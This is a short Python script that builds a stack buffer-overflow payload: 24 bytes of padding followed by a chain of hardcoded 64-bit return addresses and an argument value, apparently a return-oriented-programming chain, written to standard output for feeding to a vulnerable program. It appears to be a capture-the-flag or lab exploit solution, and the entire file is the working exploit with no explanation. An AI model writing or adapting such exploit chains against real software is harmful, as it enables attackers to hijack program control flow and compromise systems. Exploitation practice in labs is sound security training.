import sys
def pack(address):
    return address.to_bytes(8, "little")
payload = b"A" * 24
payload += pack(0x401a34)
payload += pack(0x401a33)
payload += pack(4)
payload += pack(0x401978)
payload += pack(0x401a34)
payload += pack(0x4016e0)
payload += b"\n"
sys.stdout.buffer.write(payload)
